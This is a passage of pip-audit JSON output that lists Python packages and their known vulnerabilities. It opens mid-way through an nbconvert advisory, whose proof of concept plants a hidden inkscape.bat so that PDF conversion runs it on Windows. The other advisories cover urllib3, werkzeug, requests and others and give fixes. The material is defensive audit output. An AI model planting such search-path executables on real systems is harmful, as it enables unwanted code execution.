`jupyter nbconvert --to pdf` on a notebook containing SVG output to a PDF on a Windows platform from this directory, the `inkscape.bat` file is run unexpectedly.  ### Details _Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._  `nbconvert` searches for an `inkscape` executable when converting notebooks to PDFs here: https://github.com/jupyter/nbconvert/blob/4f61702f5c7524d8a3c4ac0d5fc33a6ac2fa36a7/nbconvert/preprocessors/svg2pdf.py#L104  The MITRE page on [CWE-427 (Uncontrolled Search Path Element)](https://cwe.mitre.org/data/definitions/427.html) summarizes the root cause succinctly:  > In Windows-based systems, when the `LoadLibrary` or `LoadLibraryEx` function is called with a DLL name that does not contain a fully qualified path, the function follows a search order that includes two path elements that might be uncontrolled: > - the directory from which the program has been loaded > - the current working directory  ### PoC  _Complete instructions, including specific configuration details, to reproduce the vulnerability._  1. Create a directory containing:       - A hidden bat file called `inkscape.bat` containing `msg * \"You've been hacked!\"`      - A dummy ipynb file called `Machine_Learning.ipynb`  2. Run the command `jupyter nbconvert --to pdf Machine_Learning.ipynb`.  3. Wait a few seconds, and you should see a popup showing the message \"You've been hacked!\"   ### Impact  All Windows users."}]}, {"name": "nbformat", "version": "5.10.4", "vulns": []}, {"name": "nest-asyncio", "version": "1.6.0", "vulns": []}, {"name": "networkx", "version": "3.4.2", "vulns": []}, {"name": "nltk", "version": "3.9.1", "vulns": []}, {"name": "nodeenv", "version": "1.10.0", "vulns": []}, {"name": "notebook", "version": "7.3.2", "vulns": []}, {"name": "notebook-shim", "version": "0.2.4", "vulns": []}, {"name": "numba", "version": "0.61.0", "vulns": []}, {"name": "numexpr", "version": "2.10.1", "vulns": []}, {"name": "numpy", "version": "2.1.3", "vulns": []}, {"name": "numpydoc", "version": "1.7.0", "vulns": []}, {"name": "openpyxl", "version": "3.1.5", "vulns": []}, {"name": "overrides", "version": "7.4.0", "vulns": []}, {"name": "packageurl-python", "version": "0.17.6", "vulns": []}, {"name": "packaging", "version": "24.2", "vulns": []}, {"name": "pandas", "version": "2.2.3", "vulns": []}, {"name": "pandocfilters", "version": "1.5.0", "vulns": []}, {"name": "panel", "version": "1.7.0", "vulns": []}, {"name": "param", "version": "2.2.0", "vulns": []}, {"name": "parsel", "version": "1.8.1", "vulns": []}, {"name": "parso", "version": "0.8.4", "vulns": []}, {"name": "partd", "version": "1.4.2", "vulns": []}, {"name": "pathspec", "version": "0.10.3", "vulns": []}, {"name": "patsy", "version": "1.0.1", "vulns": []}, {"name": "pexpect", "version": "4.8.0", "vulns": []}, {"name": "pickleshare", "version": "0.7.5", "vulns": []}, {"name": "pika", "version": "1.3.2", "vulns": []}, {"name": "pillow", "version": "11.1.0", "vulns": []}, {"name": "pip", "version": "25.1", "vulns": [{"id": "CVE-2025-8869", "fix_versions": ["25.3"], "aliases": ["GHSA-4xh5-x5gv-qwph"], "description": "When extracting a tar archive pip may not check symbolic links point into the extraction directory if the tarfile module doesn't implement PEP 706. Note that upgrading pip to a \"fixed\" version for this vulnerability doesn't fix all known vulnerabilities that are remediated by using a Python version that implements PEP 706. Note that this is a vulnerability in pip's fallback implementation of tar extraction for Python versions that don't implement PEP 706 and therefore are not secure to all vulnerabilities in the Python 'tarfile' module. If you're using a Python version that implements PEP 706 then pip doesn't use the \"vulnerable\" fallback code. Mitigations include upgrading to a version of pip that includes the fix, upgrading to a Python version that implements PEP 706 (Python >=3.9.17, >=3.10.12, >=3.11.4, or >=3.12), applying the linked patch, or inspecting source distributions (sdists) before installation as is already a best-practice."}]}, {"name": "pip-api", "version": "0.0.34", "vulns": []}, {"name": "pip-audit", "version": "2.10.0", "vulns": []}, {"name": "pip-requirements-parser", "version": "32.0.1", "vulns": []}, {"name": "pkce", "version": "1.0.3", "vulns": []}, {"name": "pkginfo", "version": "1.12.0", "vulns": []}, {"name": "platformdirs", "version": "4.3.7", "vulns": []}, {"name": "plotly", "version": "5.24.1", "vulns": []}, {"name": "pluggy", "version": "1.5.0", "vulns": []}, {"name": "ply", "version": "3.11", "vulns": []}, {"name": "poyo", "version": "0.5.0", "vulns": []}, {"name": "pre-commit", "version": "4.5.1", "vulns": []}, {"name": "prometheus-client", "version": "0.21.1", "vulns": []}, {"name": "prompt-toolkit", "version": "3.0.43", "vulns": []}, {"name": "propcache", "version": "0.3.1", "vulns": []}, {"name": "protego", "version": "0.4.0", "vulns": []}, {"name": "protobuf", "version": "5.29.3", "vulns": [{"id": "CVE-2025-4565", "fix_versions": ["4.25.8", "5.29.5", "6.31.1"], "aliases": ["GHSA-8qvm-5x2c-j2w7"], "description": "### Summary Any project that uses Protobuf pure-Python backend to parse untrusted Protocol Buffers data containing an arbitrary number of **recursive groups**, **recursive messages** or **a series of [`SGROUP`](https://protobuf.dev/programming-guides/encoding/#groups) tags** can be corrupted by exceeding the Python recursion limit.  Reporter: Alexis Challande, Trail of Bits Ecosystem Security Team [ecosystem@trailofbits.com](mailto:ecosystem@trailofbits.com)  Affected versions: This issue only affects the [pure-Python implementation](https://github.com/protocolbuffers/protobuf/tree/main/python#implementation-backends) of protobuf-python backend. This is the implementation when `PROTOCOL_BUFFERS_PYTHON_IMPLEMENTATION=python` environment variable is set or the default when protobuf is used from Bazel or pure-Python PyPi wheels. CPython PyPi wheels do not use pure-Python by default.  This is a Python variant of a [previous issue affecting protobuf-java](https://github.com/protocolbuffers/protobuf/security/advisories/GHSA-735f-pc8j-v9w8).  ### Severity This is a potential Denial of Service. Parsing nested protobuf data creates unbounded recursions that can be abused by an attacker.  ### Proof of Concept For reproduction details, please refer to the unit tests [decoder_test.py](https://github.com/protocolbuffers/protobuf/blob/main/python/google/protobuf/internal/decoder_test.py#L87-L98) and [message_test](https://github.com/protocolbuffers/protobuf/blob/main/python/google/protobuf/internal/message_test.py#L1436-L1478)  ### Remediation and Mitigation A mitigation is available now. Please update to the latest available versions of the following packages: * protobuf-python(4.25.8, 5.29.5, 6.31.1)"}]}, {"name": "psutil", "version": "5.9.0", "vulns": []}, {"name": "psycopg2-binary", "version": "2.9.11", "vulns": []}, {"name": "ptyprocess", "version": "0.7.0", "vulns": []}, {"name": "pure-eval", "version": "0.2.2", "vulns": []}, {"name": "py-cpuinfo", "version": "9.0.0", "vulns": []}, {"name": "py-serializable", "version": "2.1.0", "vulns": []}, {"name": "pyarrow", "version": "19.0.0", "vulns": []}, {"name": "pyasn1", "version": "0.4.8", "vulns": []}, {"name": "pyasn1-modules", "version": "0.2.8", "vulns": []}, {"name": "pycodestyle", "version": "2.12.1", "vulns": []}, {"name": "pycosat", "version": "0.6.6", "vulns": []}, {"name": "pycparser", "version": "2.21", "vulns": []}, {"name": "pycryptodome", "version": "3.23.0", "vulns": []}, {"name": "pyct", "version": "0.5.0", "vulns": []}, {"name": "pycurl", "version": "7.45.6", "vulns": []}, {"name": "pydantic", "version": "2.10.3", "vulns": []}, {"name": "pydantic-core", "version": "2.27.1", "vulns": []}, {"name": "pydantic-settings", "version": "2.6.1", "vulns": []}, {"name": "pydispatcher", "version": "2.0.5", "vulns": []}, {"name": "pydocstyle", "version": "6.3.0", "vulns": []}, {"name": "pyerfa", "version": "2.0.1.5", "vulns": []}, {"name": "pyflakes", "version": "3.2.0", "vulns": []}, {"name": "pygithub", "version": "2.4.0", "vulns": []}, {"name": "pygments", "version": "2.19.1", "vulns": []}, {"name": "pyjwt", "version": "2.10.1", "vulns": []}, {"name": "pylint", "version": "3.3.5", "vulns": []}, {"name": "pylint-venv", "version": "3.0.3", "vulns": []}, {"name": "pyls-spyder", "version": "0.4.0", "vulns": []}, {"name": "pynacl", "version": "1.5.0", "vulns": [{"id": "CVE-2025-69277", "fix_versions": ["1.6.2"], "aliases": ["GHSA-mrfv-m5wm-5w6w"], "description": "libsodium before ad3004e, in atypical use cases involving certain custom cryptography or untrusted data to crypto_core_ed25519_is_valid_point, mishandles checks for whether an elliptic curve point is valid because it sometimes allows points that aren't in the main cryptographic group.  This advisoory lists packages in the GitHub Advisory Database's [supported ecosystems](https://github.com/github/advisory-database?tab=readme-ov-file#supported-ecosystems) that are affected by this vulnerability due to a vulnerable dependency."}]}, {"name": "pyodbc", "version": "5.2.0", "vulns": []}, {"name": "pyodps", "version": "0.12.5", "vulns": []}, {"name": "pyopenssl", "version": "25.0.0", "vulns": []}, {"name": "pyparsing", "version": "3.2.0", "vulns": []}, {"name": "pyqt5", "version": "5.15.10", "vulns": []}, {"name": "pyqt5-sip", "version": "12.13.0", "vulns": []}, {"name": "pyqtwebengine", "version": "5.15.6", "vulns": []}, {"name": "pysocks", "version": "1.7.1", "vulns": []}, {"name": "pytest", "version": "8.3.4", "vulns": []}, {"name": "pytest-asyncio", "version": "1.3.0", "vulns": []}, {"name": "pytest-cov", "version": "7.0.0", "vulns": []}, {"name": "pytest-mock", "version": "3.15.1", "vulns": []}, {"name": "python-dateutil", "version": "2.9.0.post0", "vulns": []}, {"name": "python-dotenv", "version": "1.1.0", "vulns": []}, {"name": "python-json-logger", "version": "3.2.1", "vulns": []}, {"name": "python-lsp-black", "version": "2.0.0", "vulns": []}, {"name": "python-lsp-jsonrpc", "version": "1.1.2", "vulns": []}, {"name": "python-lsp-server", "version": "1.12.2", "vulns": []}, {"name": "python-slugify", "version": "5.0.2", "vulns": []}, {"name": "pytoolconfig", "version": "1.2.6", "vulns": []}, {"name": "pytz", "version": "2024.1", "vulns": []}, {"name": "pyuca", "version": "1.2", "vulns": []}, {"name": "pyviz-comms", "version": "3.0.2", "vulns": []}, {"name": "pywavelets", "version": "1.8.0", "vulns": []}, {"name": "pyxdg", "version": "0.27", "vulns": []}, {"name": "pyyaml", "version": "6.0.2", "vulns": []}, {"name": "pyzmq", "version": "26.2.0", "vulns": []}, {"name": "qdarkstyle", "version": "3.2.3", "vulns": []}, {"name": "qstylizer", "version": "0.2.2", "vulns": []}, {"name": "qtawesome", "version": "1.4.0", "vulns": []}, {"name": "qtconsole", "version": "5.6.1", "vulns": []}, {"name": "qtpy", "version": "2.4.1", "vulns": []}, {"name": "queuelib", "version": "1.6.2", "vulns": []}, {"name": "readchar", "version": "4.0.5", "vulns": []}, {"name": "referencing", "version": "0.30.2", "vulns": []}, {"name": "regex", "version": "2024.11.6", "vulns": []}, {"name": "requests", "version": "2.32.3", "vulns": [{"id": "CVE-2024-47081", "fix_versions": ["2.32.4"], "aliases": ["GHSA-9hjg-9r4m-mvj7"], "description": "### Impact  Due to a URL parsing issue, Requests releases prior to 2.32.4 may leak .netrc credentials to third parties for specific maliciously-crafted URLs.  ### Workarounds For older versions of Requests, use of the .netrc file can be disabled with `trust_env=False` on your Requests Session ([docs](https://requests.readthedocs.io/en/latest/api/#requests.Session.trust_env)).  ### References https://github.com/psf/requests/pull/6965 https://seclists.org/fulldisclosure/2025/Jun/2"}]}, {"name": "requests-file", "version": "2.1.0", "vulns": []}, {"name": "requests-toolbelt", "version": "1.0.0", "vulns": []}, {"name": "rfc3339-validator", "version": "0.1.4", "vulns": []}, {"name": "rfc3986-validator", "version": "0.1.1", "vulns": []}, {"name": "rich", "version": "13.9.4", "vulns": []}, {"name": "roman-numerals-py", "version": "3.1.0", "vulns": []}, {"name": "rope", "version": "1.13.0", "vulns": []}, {"name": "rpds-py", "version": "0.22.3", "vulns": []}, {"name": "rtree", "version": "1.0.1", "vulns": []}, {"name": "ruamel-yaml", "version": "0.18.10", "vulns": []}, {"name": "ruamel-yaml-clib", "version": "0.2.12", "vulns": []}, {"name": "ruamel-yaml-conda", "skip_reason": "Dependency not found on PyPI and could not be audited: ruamel-yaml-conda (0.17.21)"}, {"name": "ruff", "version": "0.14.11", "vulns": []}, {"name": "s3fs", "version": "2025.3.2", "vulns": []}, {"name": "safety", "version": "3.7.0", "vulns": []}, {"name": "safety-schemas", "version": "0.0.16", "vulns": []}, {"name": "scikit-image", "version": "0.25.0", "vulns": []}, {"name": "scikit-learn", "version": "1.6.1", "vulns": []}, {"name": "scipy", "version": "1.15.3", "vulns": []}, {"name": "scrapy", "version": "2.12.0", "vulns": [{"id": "PYSEC-2017-83", "fix_versions": [], "aliases": ["GHSA-h7wm-ph43-c39p", "CVE-2017-14158"], "description": "Scrapy 1.4 allows remote attackers to cause a denial of service (memory consumption) via large files because arbitrarily many files are read into memory, which is especially problematic if the files are then individually written in a separate thread to a slow storage resource, as demonstrated by interaction between dataReceived (in core/downloader/handlers/http11.py) and S3FilesStore."}]}, {"name": "seaborn", "version": "0.13.2", "vulns": []}, {"name": "secretstorage", "version": "3.3.1", "vulns": []}, {"name": "semver", "version": "3.0.2", "vulns": []}, {"name": "send2trash", "version": "1.8.2", "vulns": []}, {"name": "service-identity", "version": "24.2.0", "vulns": []}, {"name": "setuptools", "version": "72.1.0", "vulns": [{"id": "PYSEC-2025-49", "fix_versions": ["78.1.1"], "aliases": ["CVE-2025-47273", "GHSA-5rjg-fvgr-3xxf"], "description": "setuptools is a package that allows users to download, build, install, upgrade, and uninstall Python packages. A path traversal vulnerability in `PackageIndex` is present in setuptools prior to version 78.1.1. An attacker would be allowed to write files to arbitrary locations on the filesystem with the permissions of the process running the Python code, which could escalate to remote code execution depending on the context. Version 78.1.1 fixes the issue."}]}, {"name": "shellingham", "version": "1.5.0", "vulns": []}, {"name": "sip", "version": "6.7.12", "vulns": []}, {"name": "six", "version": "1.17.0", "vulns": []}, {"name": "sklearn-compat", "version": "0.1.3", "vulns": []}, {"name": "smmap", "version": "4.0.0", "vulns": []}, {"name": "sniffio", "version": "1.3.0", "vulns": []}, {"name": "snowballstemmer", "version": "2.2.0", "vulns": []}, {"name": "sortedcontainers", "version": "2.4.0", "vulns": []}, {"name": "soupsieve", "version": "2.5", "vulns": []}, {"name": "sphinx", "version": "8.2.3", "vulns": []}, {"name": "sphinxcontrib-applehelp", "version": "2.0.0", "vulns": []}, {"name": "sphinxcontrib-devhelp", "version": "2.0.0", "vulns": []}, {"name": "sphinxcontrib-htmlhelp", "version": "2.1.0", "vulns": []}, {"name": "sphinxcontrib-jsmath", "version": "1.0.1", "vulns": []}, {"name": "sphinxcontrib-qthelp", "version": "2.0.0", "vulns": []}, {"name": "sphinxcontrib-serializinghtml", "version": "2.0.0", "vulns": []}, {"name": "spyder", "version": "6.0.7", "vulns": []}, {"name": "spyder-kernels", "version": "3.0.5", "vulns": []}, {"name": "sqlalchemy", "version": "2.0.39", "vulns": []}, {"name": "stack-data", "version": "0.2.0", "vulns": []}, {"name": "statsmodels", "version": "0.14.4", "vulns": []}, {"name": "stevedore", "version": "5.6.0", "vulns": []}, {"name": "streamlit", "version": "1.45.1", "vulns": []}, {"name": "superqt", "version": "0.7.3", "vulns": []}, {"name": "sympy", "version": "1.13.3", "vulns": []}, {"name": "tables", "version": "3.10.2", "vulns": []}, {"name": "tabulate", "version": "0.9.0", "vulns": []}, {"name": "tblib", "version": "3.1.0", "vulns": []}, {"name": "tenacity", "version": "9.0.0", "vulns": []}, {"name": "terminado", "version": "0.17.1", "vulns": []}, {"name": "text-unidecode", "version": "1.3", "vulns": []}, {"name": "textdistance", "version": "4.6.3", "vulns": []}, {"name": "threadpoolctl", "version": "3.5.0", "vulns": []}, {"name": "three-merge", "version": "0.1.1", "vulns": []}, {"name": "tifffile", "version": "2025.2.18", "vulns": []}, {"name": "tinycss2", "version": "1.4.0", "vulns": []}, {"name": "tldextract", "version": "5.1.2", "vulns": []}, {"name": "toml", "version": "0.10.2", "vulns": []}, {"name": "tomli", "version": "2.4.0", "vulns": []}, {"name": "tomli-w", "version": "1.2.0", "vulns": []}, {"name": "tomlkit", "version": "0.13.2", "vulns": []}, {"name": "toolz", "version": "1.0.0", "vulns": []}, {"name": "tornado", "version": "6.5.1", "vulns": []}, {"name": "tqdm", "version": "4.67.1", "vulns": []}, {"name": "traitlets", "version": "5.14.3", "vulns": []}, {"name": "truststore", "version": "0.10.0", "vulns": []}, {"name": "twisted", "version": "24.11.0", "vulns": []}, {"name": "typer", "version": "0.21.1", "vulns": []}, {"name": "types-pika", "version": "1.2.0b1", "vulns": []}, {"name": "types-psycopg2", "version": "2.9.21.20251012", "vulns": []}, {"name": "typing-extensions", "version": "4.12.2", "vulns": []}, {"name": "tzdata", "version": "2025.2", "vulns": []}, {"name": "uc-micro-py", "version": "1.0.1", "vulns": []}, {"name": "ujson", "version": "5.10.0", "vulns": []}, {"name": "unidecode", "version": "1.3.8", "vulns": []}, {"name": "urllib3", "version": "2.3.0", "vulns": [{"id": "CVE-2025-50182", "fix_versions": ["2.5.0"], "aliases": ["GHSA-48p4-8xcf-vxj5"], "description": "urllib3 [supports](https://urllib3.readthedocs.io/en/2.4.0/reference/contrib/emscripten.html) being used in a Pyodide runtime utilizing the [JavaScript Fetch API](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API) or falling back on [XMLHttpRequest](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest). This means you can use Python libraries to make HTTP requests from your browser or Node.js. Additionally, urllib3 provides [a mechanism](https://urllib3.readthedocs.io/en/2.4.0/user-guide.html#retrying-requests) to control redirects.  However, the `retries` and `redirect` parameters are ignored with Pyodide; the runtime itself determines redirect behavior.   ## Affected usages  Any code which relies on urllib3 to control the number of redirects for an HTTP request in a Pyodide runtime.   ## Impact  Redirects are often used to exploit SSRF vulnerabilities. An application attempting to mitigate SSRF or open redirect vulnerabilities by disabling redirects may remain vulnerable if a Pyodide runtime redirect mechanism is unsuitable.   ## Remediation  If you use urllib3 in Node.js, upgrade to a patched version of urllib3.  Unfortunately, browsers provide no suitable way which urllib3 can use: `XMLHttpRequest` provides no control over redirects, the Fetch API returns `opaqueredirect` responses lacking data when redirects are controlled manually. Expect default browser behavior for redirects."}, {"id": "CVE-2025-50181", "fix_versions": ["2.5.0"], "aliases": ["GHSA-pq67-6m6q-mj2v"], "description": "urllib3 handles redirects and retries using the same mechanism, which is controlled by the `Retry` object. The most common way to disable redirects is at the request level, as follows:  ```python resp = urllib3.request(\"GET\", \"https://httpbin.org/redirect/1\", redirect=False) print(resp.status) # 302 ```  However, it is also possible to disable redirects, for all requests, by instantiating a `PoolManager` and specifying `retries` in a way that disable redirects:  ```python import urllib3  http = urllib3.PoolManager(retries=0)  # should raise MaxRetryError on redirect http = urllib3.PoolManager(retries=urllib3.Retry(redirect=0))  # equivalent to the above http = urllib3.PoolManager(retries=False)  # should return the first response  resp = http.request(\"GET\", \"https://httpbin.org/redirect/1\") ```  However, the `retries` parameter is currently ignored, which means all the above examples don't disable redirects.  ## Affected usages  Passing `retries` on `PoolManager` instantiation to disable redirects or restrict their number.  By default, requests and botocore users are not affected.  ## Impact  Redirects are often used to exploit SSRF vulnerabilities. An application attempting to mitigate SSRF or open redirect vulnerabilities by disabling redirects at the PoolManager level will remain vulnerable.  ## Remediation  You can remediate this vulnerability with the following steps:   * Upgrade to a patched version of urllib3. If your organization would benefit from the continued support of urllib3 1.x, please contact [sethmichaellarson@gmail.com](mailto:sethmichaellarson@gmail.com) to discuss sponsorship or contribution opportunities.  * Disable redirects at the `request()` level instead of the `PoolManager()` level."}, {"id": "CVE-2025-66418", "fix_versions": ["2.6.0"], "aliases": ["GHSA-gm62-xv2j-4w53"], "description": "## Impact  urllib3 supports chained HTTP encoding algorithms for response content according to RFC 9110 (e.g., `Content-Encoding: gzip, zstd`).  However, the number of links in the decompression chain was unbounded allowing a malicious server to insert a virtually unlimited number of compression steps leading to high CPU usage and massive memory allocation for the decompressed data.   ## Affected usages  Applications and libraries using urllib3 version 2.5.0 and earlier for HTTP requests to untrusted sources unless they disable content decoding explicitly.   ## Remediation  Upgrade to at least urllib3 v2.6.0 in which the library limits the number of links to 5.  If upgrading is not immediately possible, use [`preload_content=False`](https://urllib3.readthedocs.io/en/2.5.0/advanced-usage.html#streaming-and-i-o) and ensure that `resp.headers[\"content-encoding\"]` contains a safe number of encodings before reading the response content."}, {"id": "CVE-2025-66471", "fix_versions": ["2.6.0"], "aliases": ["GHSA-2xpw-w6gg-jr37"], "description": "### Impact  urllib3's [streaming API](https://urllib3.readthedocs.io/en/2.5.0/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.  When streaming a compressed response, urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). The library must read compressed data from the network and decompress it until the requested chunk size is met. Any resulting decompressed data that exceeds the requested amount is held in an internal buffer for the next read operation.  The decompression logic could cause urllib3 to fully decode a small amount of highly compressed data in a single operation. This can result in excessive resource consumption (high CPU usage and massive memory allocation for the decompressed data; CWE-409) on the client side, even if the application only requested a small chunk of data.   ### Affected usages  Applications and libraries using urllib3 version 2.5.0 and earlier to stream large compressed responses or content from untrusted sources.  `stream()`, `read(amt=256)`, `read1(amt=256)`, `read_chunked(amt=256)`, `readinto(b)` are examples of `urllib3.HTTPResponse` method calls using the affected logic unless decoding is disabled explicitly.   ### Remediation  Upgrade to at least urllib3 v2.6.0 in which the library avoids decompressing data that exceeds the requested amount.  If your environment contains a package facilitating the Brotli encoding, upgrade to at least Brotli 1.2.0 or brotlicffi 1.2.0.0 too. These versions are enforced by the `urllib3[brotli]` extra in the patched versions of urllib3.   ### Credits  The issue was reported by @Cycloctane. Supplemental information was provided by @stamparm during a security audit performed by [7ASecurity](https://7asecurity.com/) and facilitated by [OSTIF](https://ostif.org/)."}, {"id": "CVE-2026-21441", "fix_versions": ["2.6.3"], "aliases": ["GHSA-38jv-5279-wg99"], "description": "### Impact  urllib3's [streaming API](https://urllib3.readthedocs.io/en/2.6.2/advanced-usage.html#streaming-and-i-o) is designed for the efficient handling of large HTTP responses by reading the content in chunks, rather than loading the entire response body into memory at once.  urllib3 can perform decoding or decompression based on the HTTP `Content-Encoding` header (e.g., `gzip`, `deflate`, `br`, or `zstd`). When using the streaming API, the library decompresses only the necessary bytes, enabling partial content consumption.  However, for HTTP redirect responses, the library would read the entire response body to drain the connection and decompress the content unnecessarily. This decompression occurred even before any read methods were called, and configured read limits did not restrict the amount of decompressed data. As a result, there was no safeguard against decompression bombs. A malicious server could exploit this to trigger excessive resource consumption on the client (high CPU usage and large memory allocations for decompressed data; CWE-409).  ### Affected usages  Applications and libraries using urllib3 version 2.6.2 and earlier to stream content from untrusted sources by setting `preload_content=False` when they do not disable redirects.   ### Remediation  Upgrade to at least urllib3 v2.6.3 in which the library does not decode content of redirect responses when `preload_content=False`.  If upgrading is not immediately possible, disable [redirects](https://urllib3.readthedocs.io/en/2.6.2/user-guide.html#retrying-requests) by setting `redirect=False` for requests to untrusted source."}]}, {"name": "uv", "version": "0.9.25", "vulns": []}, {"name": "virtualenv", "version": "20.36.1", "vulns": []}, {"name": "w3lib", "version": "1.21.0", "vulns": []}, {"name": "watchdog", "version": "4.0.2", "vulns": []}, {"name": "wcwidth", "version": "0.2.5", "vulns": []}, {"name": "webencodings", "version": "0.5.1", "vulns": []}, {"name": "websocket-client", "version": "1.8.0", "vulns": []}, {"name": "websockets", "version": "15.0.1", "vulns": []}, {"name": "werkzeug", "version": "3.1.3", "vulns": [{"id": "CVE-2025-66221", "fix_versions": ["3.1.4"], "aliases": ["GHSA-hgf8-39gv-g3f2"], "description": "Werkzeug's `safe_join` function allows path segments with Windows device names. On Windows, there are special device names such as `CON`, `AUX`, etc that are implicitly present and readable in every directory. `send_from_directory` uses `safe_join` to safely serve files at user-specified paths under a directory. If the application is running on Windows, and the requested path ends with a special device name, the file will be opened successfully, but reading will hang indefinitely."}, {"id": "CVE-2026-21860", "fix_versions": ["3.1.5"], "aliases": ["GHSA-87hc-h4r5-73f7"], "description": "Werkzeug's `safe_join` function allows path segments with Windows device names that have file extensions or trailing spaces. On Windows, there are special device names such as `CON`, `AUX`, etc that are implicitly present and readable in every directory. Windows still accepts them with any file extension, such as `CON.txt`, or trailing spaces such as `CON `.  This was previously reported as https://github.com/pallets/werkzeug/security/advisories/GHSA-hgf8-39gv-g3f2, but the fix failed to account for compound extensions such as `CON.txt.html` or trailing spaces. It also missed some additional special names.  `send_from_directory` uses `safe_join` to safely serve files at user-specified paths under a directory. If the application is running on Windows, and the requested path ends with a special device name, the file will be opened successfully, but reading will hang indefinitely."}]}, {"name": "whatthepatch", "version": "1.0.2", "vulns": []}, {"name": "wheel", "version": "0.45.1", "vulns": []}, {"name": "widgetsnbextension", "version": "4.0.13", "vulns": []}, {"name": "wrapt", "version": "1.17.0", "vulns": []}, {"name": "wurlitzer", "version": "3.0.2", "vulns": []}, {"name": "xarray", "version": "2025.4.0", "vulns": []}, {"name": "xyzservices", "version": "2022.9.0", "vulns": []}, {"name": "yapf", "version": "0.40.2", "vulns": []}, {"name": "yarl", "version": "1.18.0", "vulns": []}, {"name": "zict", "version": "3.0.0", "vulns": []}, {"name": "zipp", "version": "3.21.0", "vulns": []}, {"name": "zope-interface", "version": "7.1.1", "vulns": []}, {"name": "zstandard", "version": "0.23.0", "vulns": []}], "fixes": []}
